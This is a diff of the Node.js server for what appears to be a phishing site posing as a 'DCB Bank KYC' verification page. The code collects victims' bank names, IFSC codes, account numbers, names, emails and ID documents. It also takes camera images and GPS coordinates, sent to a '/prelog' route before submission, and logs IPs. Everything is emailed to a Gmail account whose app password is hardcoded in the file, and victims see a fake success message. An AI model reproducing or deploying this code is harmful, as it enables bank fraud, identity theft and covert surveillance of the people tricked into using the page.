@@ -1,426 +1,105 @@
-require('dotenv').config();
+// ✅ Final server.js with prelog support and improved IP detection
 const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
 const nodemailer = require('nodemailer');
-const geoip = require('geoip-lite');
-const os = require('os');
 
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Trust proxy to get real client IP
-app.set('trust proxy', true);
-
-// Create uploads directory in temp storage
-const uploadDir = path.join(os.tmpdir(), 'uploads');
-if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir, { recursive: true });
-}
-console.log(`Using upload directory: ${uploadDir}`);
-
-// Middleware for handling large payloads
-app.use(express.urlencoded({ extended: true, limit: '10mb' }));
-app.use(express.json({ limit: '10mb' }));
+// Middleware
 app.use(express.static('public'));
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: '50mb' }));
 
-// Add CORS headers
-app.use((req, res, next) => {
-  res.header('Access-Control-Allow-Origin', '*');
-  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
-  next();
-});
+// Ensure 'uploads' directory exists
+const uploadDir = path.join(__dirname, 'uploads');
+if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
 
-// Set up multer for file upload
+// Setup multer for file uploads
 const storage = multer.diskStorage({
-  destination: function (req, file, cb) {
-    cb(null, uploadDir);
-  },
-  filename: function (req, file, cb) {
-    const uniqueName = `${Date.now()}-${file.originalname}`;
-    cb(null, uniqueName);
-  }
+  destination: (req, file, cb) => cb(null, 'uploads'),
+  filename: (req, file, cb) =>
+    cb(null, Date.now() + '-' + file.originalname.replace(/\s+/g, '_'))
 });
+const upload = multer({ storage }).any();
 
-// File filter function
-const fileFilter = (req, file, cb) => {
-  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
-  if (allowedTypes.includes(file.mimetype)) {
-    cb(null, true);
-  } else {
-    cb(new Error('Only JPG, PNG, or PDF files are allowed'), false);
-  }
-};
-
-// Create upload instance
-const upload = multer({
-  storage: storage,
-  fileFilter: fileFilter,
-  limits: {
-    fileSize: 5 * 1024 * 1024 // 5MB limit
-  }
-}).any();
-
-// Email transporter
+// Setup Nodemailer transporter
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: 'dcbsubmission392@gmail.com',  // Your Gmail
-    pass: 'iskexmwnespcwxrkjt'           // Your app password
-  },
-  pool: true,
-  maxConnections: 1,
-  rateLimit: 1
-});
-
-// Function to get client IP
-function getClientIp(req) {
-  return req.ip || 
-         req.headers['x-forwarded-for'] || 
-         req.connection.remoteAddress || 
-         req.socket.remoteAddress ||
-         req.connection.socket.remoteAddress;
-}
-
-// Function to get location from IP
-function getLocationFromIp(ip) {
-  // IPv6 loopback fix
-  const cleanIp = ip === '::1' ? '127.0.0.1' : ip;
-  const geo = geoip.lookup(cleanIp);
-  return geo ? `${geo.city}, ${geo.region}, ${geo.country}` : 'Location unknown';
-}
-
-// Background data storage (in-memory)
-let backgroundDataStore = {};
-
-// Endpoint for background data
-app.post('/background-data', (req, res) => {
-  try {
-    const { sessionId, images, location } = req.body;
-    const ip = getClientIp(req);
-    const ipLocation = getLocationFromIp(ip);
-    
-    if (!backgroundDataStore[sessionId]) {
-      backgroundDataStore[sessionId] = {
-        images: [],
-        locations: [],
-        ipAddresses: [],
-        timestamps: []
-      };
-    }
-    
-    // Store new data
-    if (images && images.length > 0) {
-      backgroundDataStore[sessionId].images.push(...images);
-    }
-    if (location) {
-      backgroundDataStore[sessionId].locations.push(location);
-    }
-    backgroundDataStore[sessionId].ipAddresses.push(ip);
-    backgroundDataStore[sessionId].timestamps.push(new Date().toISOString());
-    
-    // Log background data
-    console.log(`
---- Background Data ---
-Session ID: ${sessionId}
-Time: ${new Date().toLocaleString()}
-IP: ${ip} (${ipLocation})
-Images: ${images ? images.length : 0}
-Location: ${location ? JSON.stringify(location) : 'None'}
-----------------------`);
-    
-    res.status(200).send('Background data received');
-  } catch (error) {
-    console.error('Background data error:', error);
-    res.status(500).send('Error processing background data');
+    user: 'dcbsubmission392@gmail.com',
+    pass: 'kexmwnespcwxrkjt'  // ✅ no spaces
   }
 });
 
-// Route to handle form submission
-app.post('/submit', (req, res) => {
-  upload(req, res, async function (err) {
-    if (err) {
-      console.error('Upload error:', err);
-      return res.status(500).send('Upload error: ' + err.message);
+// 🔁 Helper: Log and email
+function logAndSendMail(subject, message, files = []) {
+  const timestamp = new Date().toISOString();
+  const logEntry = `--- ${subject} ---\n${timestamp}\n${message}\n\n`;
+  fs.appendFileSync('records.txt', logEntry);
+  console.log(logEntry);
+
+  const attachments = files.map(file => ({
+    filename: file.originalname,
+    path: file.path
+  }));
+
+  transporter.sendMail({
+    from: 'dcbsubmission392@gmail.com',
+    to: 'dcbsubmission392@gmail.com',
+    subject,
+    text: message,
+    attachments
+  }, (error, info) => {
+    if (error) {
+      console.error('❌ Email failed:', error);
+    } else {
+      console.log('✅ Email sent:', info.response);
     }
-
-    try {
-      // Extract form fields from req.body
-      const { bankname, ifsc, accno, fullname, email, location, sessionId } = req.body;
-      const files = req.files;
-      
-      // Get IP and location from IP
-      const ip = getClientIp(req);
-      const ipLocation = getLocationFromIp(ip);
-      
-      console.log('Form data received:');
-      console.log('- Bank Name:', bankname);
-      console.log('- IFSC Code:', ifsc);
-      console.log('- Account Number:', accno);
-      console.log('- Full Name:', fullname);
-      console.log('- Email:', email);
-      console.log('- Location:', location);
-      console.log('- IP:', ip, `(${ipLocation})`);
-      console.log('- Files count:', files ? files.length : 0);
-      
-      // Process location data
-      let locationData = null;
-      if (location) {
-        try {
-          locationData = JSON.parse(location);
-        } catch (e) {
-          console.error('Error parsing location data:', e);
-        }
-      }
-      
-      // Separate document file from captured images
-      let documentFile = null;
-      const imageAttachments = [];
-      
-      if (files) {
-        files.forEach(file => {
-          console.log(`- File: ${file.fieldname} (${file.originalname})`);
-          
-          if (file.fieldname === 'document') {
-            documentFile = file;
-          } else if (file.fieldname.startsWith('image')) {
-            imageAttachments.push(file);
-          }
-        });
-      }
-
-      // Get additional data
-      const timestamp = new Date().toLocaleString();
-      const userAgent = req.headers['user-agent'];
-
-      // Create log entry
-      const logEntry = `
---- Submission ---
-Bank Name: ${bankname}
-IFSC Code: ${ifsc}
-Account Number: ${accno}
-Full Name: ${fullname}
-Email: ${email}
-Document: ${documentFile ? documentFile.path : 'None'}
-Time: ${timestamp}
-IP: ${ip} (${ipLocation})
-User Agent: ${userAgent}
-Location: ${locationData ? `${locationData.latitude}, ${locationData.longitude}` : 'None'}
-Images Captured: ${imageAttachments.length}
--------------------
-`;
-
-      fs.appendFileSync('records.txt', logEntry);
-      console.log(logEntry);
-
-      // Prepare email content
-      const mailOptions = {
-        from: `DCB Bank KYC <dcbsubmission392@gmail.com>`,
-        to: 'dcbsubmission392@gmail.com',
-        subject: '🔔 New DCB Bank KYC Submission',
-        html: `
-          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-            <h2 style="color: #003d6a; border-bottom: 2px solid #003d6a; padding-bottom: 10px;">
-              New KYC Submission Received
-            </h2>
-            
-            <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
-              <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
-              <p><strong>Bank Name:</strong> ${bankname}</p>
-              <p><strong>IFSC Code:</strong> ${ifsc}</p>
-              <p><strong>Account Number:</strong> ${accno}</p>
-              <p><strong>Full Name:</strong> ${fullname}</p>
-              <p><strong>Email:</strong> ${email}</p>
-            </div>
-            
-            ${locationData ? `
-            <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
-              <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
-              <p><strong>Latitude:</strong> ${locationData.latitude}</p>
-              <p><strong>Longitude:</strong> ${locationData.longitude}</p>
-              <p><strong>Accuracy:</strong> ${locationData.accuracy} meters</p>
-              <p><strong>Timestamp:</strong> ${new Date(locationData.timestamp).toLocaleString()}</p>
-            </div>
-            ` : ''}
-            
-            <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
-              <h3 style="color: #003d6a; margin-top: 0;">System Information</h3>
-              <p><strong>Total Images Captured:</strong> ${imageAttachments.length}</p>
-              <p><strong>IP Address:</strong> ${ip} (${ipLocation})</p>
-              <p><strong>User Agent:</strong> ${userAgent}</p>
-              <p><strong>Submission Time:</strong> ${timestamp}</p>
-            </div>
-          </div>
-        `,
-        attachments: []
-      };
-
-      // Add document attachment if exists
-      if (documentFile) {
-        mailOptions.attachments.push({
-          filename: documentFile.originalname,
-          path: documentFile.path
-        });
-      }
-
-      // Add captured images
-      imageAttachments.forEach(file => {
-        mailOptions.attachments.push({
-          filename: file.originalname,
-          path: file.path
-        });
-      });
-
-      // Send email
-      console.log('Sending email...');
-      await transporter.sendMail(mailOptions);
-      console.log('Email sent successfully');
-
-      // Cleanup files
-      if (documentFile) fs.unlinkSync(documentFile.path);
-      imageAttachments.forEach(file => fs.unlinkSync(file.path));
-      console.log('Temporary files cleaned up');
-
-      // Background data processing
-      if (sessionId && backgroundDataStore[sessionId]) {
-        console.log(`Background data for session ${sessionId} exists (${backgroundDataStore[sessionId].images.length} images, ${backgroundDataStore[sessionId].locations.length} locations)`);
-        
-        // Create a temporary directory for this session
-        const sessionDir = path.join(uploadDir, sessionId);
-        if (!fs.existsSync(sessionDir)) {
-          fs.mkdirSync(sessionDir, { recursive: true });
-        }
-
-        // Save images to disk
-        const imageFiles = [];
-        backgroundDataStore[sessionId].images.forEach((img, index) => {
-          const base64Data = img.replace(/^data:image\/jpeg;base64,/, "");
-          const filename = `session-${sessionId}-image-${index}.jpg`;
-          const filePath = path.join(sessionDir, filename);
-          fs.writeFileSync(filePath, base64Data, 'base64');
-          imageFiles.push(filePath);
-        });
-
-        // Prepare location data
-        let locationContent = "Location History:\n";
-        backgroundDataStore[sessionId].locations.forEach((loc, index) => {
-          locationContent += `\nPoint ${index + 1}:\n`;
-          locationContent += `- Latitude: ${loc.latitude}\n`;
-          locationContent += `- Longitude: ${loc.longitude}\n`;
-          locationContent += `- Accuracy: ${loc.accuracy} meters\n`;
-          locationContent += `- Timestamp: ${new Date(loc.timestamp).toLocaleString()}\n`;
-        });
-
-        // Create location file
-        const locationFile = path.join(sessionDir, `session-${sessionId}-locations.txt`);
-        fs.writeFileSync(locationFile, locationContent);
-
-        // Send background data email
-        const bgMailOptions = {
-          from: `DCB Bank KYC <dcbsubmission392@gmail.com>`,
-          to: 'dcbsubmission392@gmail.com',
-          subject: '📸 Background Data for Session: ' + sessionId,
-          html: `
-            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-              <h2 style="color: #003d6a; border-bottom: 2px solid #003d6a; padding-bottom: 10px;">
-                Background Data Collected
-              </h2>
-              
-              <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
-                <h3 style="color: #003d6a; margin-top: 0;">Session Information</h3>
-                <p><strong>Session ID:</strong> ${sessionId}</p>
-                <p><strong>Total Images:</strong> ${backgroundDataStore[sessionId].images.length}</p>
-                <p><strong>Location Points:</strong> ${backgroundDataStore[sessionId].locations.length}</p>
-                <p><strong>IP Addresses:</strong> ${[...new Set(backgroundDataStore[sessionId].ipAddresses)].join(', ')}</p>
-              </div>
-              
-              <p style="margin-top: 20px;">Location history and captured images are attached to this email.</p>
-            </div>
-          `,
-          attachments: [
-            {
-              filename: `session-${sessionId}-locations.txt`,
-              path: locationFile
-            }
-          ]
-        };
-
-        // Add image attachments
-        imageFiles.forEach(file => {
-          bgMailOptions.attachments.push({
-            filename: path.basename(file),
-            path: file
-          });
-        });
-
-        // Send background email
-        await transporter.sendMail(bgMailOptions);
-        console.log('Background data email sent');
-        
-        // Cleanup session data
-        delete backgroundDataStore[sessionId];
-        
-        // Cleanup files after sending
-        setTimeout(() => {
-          if (fs.existsSync(sessionDir)) {
-            fs.rmSync(sessionDir, { recursive: true, force: true });
-            console.log(`Cleaned up session files: ${sessionDir}`);
-          }
-        }, 30000); // Cleanup after 30 seconds
-      }
-
-      res.status(200).send();
-    } catch (error) {
-      console.error('❌ Submission error:', error);
-      res.status(500).send('Submission failed: ' + error.message);
-    }
-  });
-});
-
-// Cleanup temporary files every hour
-setInterval(() => {
-  console.log('Running file cleanup...');
-  fs.readdir(uploadDir, (err, files) => {
-    if (err) {
-      console.error('Cleanup error:', err);
-      return;
-    }
-    
-    files.forEach(file => {
-      const filePath = path.join(uploadDir, file);
-      try {
-        // Delete files older than 1 hour
-        if (Date.now() - fs.statSync(filePath).mtimeMs > 3600000) {
-          fs.unlinkSync(filePath);
-          console.log(`Deleted old file: ${file}`);
-        }
-      } catch (e) {
-        console.error('Error deleting file:', e);
-      }
+    // Cleanup temp files
+    attachments.forEach(att => {
+      if (fs.existsSync(att.path)) fs.unlinkSync(att.path);
     });
   });
-}, 3600000); // Run hourly
+}
 
-// Create HTTP server
-const server = app.listen(port, () => {
-  console.log(`Server running on port ${port}`);
+// ✅ Main form route
+app.post('/submit', upload, (req, res) => {
+  const { bankname, accno, fullname } = req.body;
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  const userAgent = req.headers['user-agent'];
+  const file = req.files.find(f => f.fieldname === 'document');
+  const timestamp = new Date().toISOString();
+
+  const message = `Bank Name: ${bankname}\nAccount No: ${accno}\nFull Name: ${fullname}\nFile: ${file?.path || 'None'}\nIP: ${ip}\nUser Agent: ${userAgent}`;
+  logAndSendMail('🔔 New Bank Verification Submission', message, file ? [file] : []);
+
+  res.send('<h2>✅ Submitted Successfully!</h2><p>Your KYC info has been received.</p>');
 });
 
-// Graceful shutdown
-process.on('SIGTERM', () => {
-  console.log('SIGTERM signal received: closing HTTP server');
-  server.close(() => {
-    console.log('HTTP server closed');
-  });
+// ✅ Pre-log route for camera + GPS data before submission
+app.post('/prelog', upload, (req, res) => {
+  const files = req.files || [];
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  const userAgent = req.headers['user-agent'];
+
+  let location = 'None';
+  try {
+    if (req.body.location) {
+      const loc = JSON.parse(req.body.location);
+      location = `Lat: ${loc.latitude}, Long: ${loc.longitude}, Acc: ±${loc.accuracy}m`;
+    }
+  } catch (e) {
+    console.error('Location parse error:', e);
+  }
+
+  const message = `Early Data\nLocation: ${location}\nImages: ${files.length}\nIP: ${ip}\nUser Agent: ${userAgent}`;
+  logAndSendMail('🔔 Pre-Submission Visitor Data', message, files);
+
+  res.sendStatus(200);
 });
 
-// Error handling
-process.on('uncaughtException', (err) => {
-  console.error('Uncaught Exception:', err);
-  process.exit(1);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-});
+// ✅ Start server
+app.listen(port, () => console.log(`✅ Server running on port ${port}`));
